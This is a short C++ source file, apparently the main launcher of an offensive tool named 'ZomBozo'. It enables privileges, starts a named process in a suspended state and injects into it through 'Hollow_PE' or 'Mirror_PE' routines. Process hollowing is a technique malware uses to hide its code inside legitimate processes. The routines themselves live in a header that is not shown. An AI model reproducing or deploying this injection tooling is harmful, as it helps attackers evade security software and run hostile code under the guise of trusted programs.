#include "Functions.h"
int main(int argc, char* argv[])
{
	if (argc < 2) {
		printf("Usage: ZomBozo.exe process_name");
		ExitProcess(0);
	}
	PROCESS_INFORMATION pi;
	STARTUPINFO si;
	RtlZeroMemory(&si, sizeof si);
	si.cb = sizeof si;
	RtlZeroMemory(&pi, sizeof pi);
	enable_priv();
	int act;
	printf("[*] enter the module you wanna use: \n1)Hollow_PE\n2)Mirror_PE\n");
	std::cin >> act;
	if (CreateProcessA(NULL, argv[1], NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi)) {
		printf("[+] process created\n");
		BOOL result = FALSE;
		switch (act) {
		case 1:
			result = hollow_pe(pi.hProcess, pi.hThread);
			break;
		case 2:
			result = mirror_pe(pi.hProcess, pi.hThread);
			break;
		default:
			printf("[*] wrong choice\n");
		}
		if (result) {
			printf("[+] Success");
		}
		else {
			printf("[-] Failed");
		}
		TerminateProcess(GetCurrentProcess(), 0);
	}
	else {
		printf("[-] Could not create the process %d\n", GetLastError());
	}
	return 0;
}
